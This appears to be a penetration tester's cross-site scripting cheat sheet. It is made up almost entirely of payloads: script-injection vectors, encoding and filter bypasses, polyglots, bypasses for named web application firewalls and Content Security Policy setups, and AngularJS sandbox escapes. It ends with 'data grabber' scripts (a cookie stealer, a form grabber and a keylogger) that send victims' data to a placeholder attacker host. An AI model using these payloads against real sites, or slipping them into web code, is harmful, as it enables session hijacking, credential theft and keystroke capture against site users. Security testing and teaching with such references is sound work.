# XSS Reference

## XSS Types & Basic Payloads

### Reflected / Stored
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
```

### DOM-Based (dangerous sinks)
Sinks: `document.write`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval`, `setTimeout`, `location.href`, `location.hash`
Sources: `document.URL`, `document.referrer`, `location.search`, `location.hash`, `window.name`

```js
# Hash-based
http://example.com/#<img src=x onerror=alert(1)>
# PostMessage
window.addEventListener("message", (e) => eval(e.data))
```

### Blind XSS
Tools: xsshunter, canarytokens, interactsh
```html
<script src="https://yourserver/payload.js"></script>
<img src=x onerror="this.src='https://yourserver/?c='+document.cookie">
```

### Mutation XSS (mXSS)
```html
<listing><img src=x onerror=alert(1)></listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## XSS Filter Bypass

### Case Bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Encoding Bypass
```html
<!-- URL encode -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E
<!-- Double URL encode -->
%253Cscript%253E
<!-- HTML entity -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- Unicode -->
<img src=x onerror=alert(1)>
```

### Event Handlers
```html
<!-- Without quotes -->
<img src=x onerror=alert`1`>
<svg onload=alert(1)>
<!-- Newline injection -->
<img src="x"
onerror="alert(1)">
<!-- Tab injection -->
<img	src=x	onerror=alert(1)>
```

### Script Obfuscation
```html
<!-- eval bypass -->
<script>eval('ale'+'rt(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- Function constructor -->
<script>(function(){})['constructor']('alert(1)')()</script>
<script>Function('alert(1)')()</script>
<!-- setTimeout/setInterval -->
<script>setTimeout('alert(1)',0)</script>
<!-- Template literal -->
<script>eval`alert(1)`</script>
<!-- String.fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### JSFuck (no letters/digits)
```js
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
```

### Filter Bypass
```html
<!-- <script> filtered -->
<img src=x onerror=alert(1)>
<!-- on* filtered -->
<a href="javascript:alert(1)">click</a>
<!-- alert filtered -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<!-- parentheses filtered -->
<script>alert`1`</script>
<!-- spaces filtered -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
```

---

## XSS Polyglots

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">
```

```javascript
-->'"/></sCript><svG x=">" onload=(confirm)``>
```

```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

---

## WAF Bypass

### Cloudflare
```js
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
1'"><img/src/onerror=.1|alert``>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Incapsula
```js
<svg onload\r\n=$.globalEval("al"+"ert()");>
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

### Akamai
```svg
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### WordFence
```html
<a href=javas&#99;ript:alert(1)>
```

### Fortiweb
```javascript
><h1 onclick=alert('1')>
```

---

## CSP Bypass

### JSONP (whitelist abuse)
```
CSP: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
// Google Account:
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
// Google Translate:
https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();
// Youtube:
https://www.youtube.com/oembed?callback=alert;
```

### default-src 'self' + iframe
```
CSP: default-src 'self' 'unsafe-inline';
```
```js
f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//ATTACKER/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);
```

### CSP nonce via base tag injection
```
CSP: script-src 'nonce-RANDOM_NONCE'
```
```html
<base href=http://ATTACKER.DOMAIN.TLD>
```
Host your JS at the same path as the whitelisted script.

### PHP header bypass (1000 params)
```
GET /?xss=<script>alert(1)</script>&a&a&a...[1000 times]
```
Forces PHP `header()` to fail → CSP header not sent.

### CSP script-src data:
```javascript
<script src="data:,alert(1)">/</script>
```

### CSP script-src self (object tag)
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### unsafe-inline
```javascript
"/><script>alert(1);</script>
```

---

## AngularJS CSTI (Client-Side Template Injection)

### 1.6+ (sandbox removed)
```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor&#40'alert(1)'&#41&#40&#41}}
{{0[a='constructor'][a]('alert(1)')()}}
```

### 1.5.0 - 1.5.8
```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### 1.4.0 - 1.4.9
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

### 1.3.20
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

### 1.2.24 - 1.2.29
```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

### Advanced (without quotes/constructor)
```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

### Blind XSS (load remote script)
```javascript
{{constructor.constructor("var _ = document.createElement('script');_.src='//localhost/m';document.getElementsByTagName('body')[0].appendChild(_)")()}}
```

### Angular auto-sanitization bypass methods (code review sinks)
- `bypassSecurityTrustHtml`
- `bypassSecurityTrustScript`
- `bypassSecurityTrustStyle`
- `bypassSecurityTrustUrl`
- `bypassSecurityTrustResourceUrl`

---

## XSS Data Grabbers

```javascript
// Cookie stealer
<img src=x onerror="fetch('https://ATTACKER/?c='+document.cookie)">
// Via redirect
<script>document.location='https://ATTACKER/?c='+document.cookie</script>
// Form grabber (grab all input)
<script>
var inputs = document.querySelectorAll('input');
inputs.forEach(i => i.addEventListener('change', e => fetch('https://ATTACKER/?d='+e.target.value)));
</script>
// Keylogger
<script>document.onkeypress=function(e){fetch('https://ATTACKER/?k='+e.key)}</script>
```
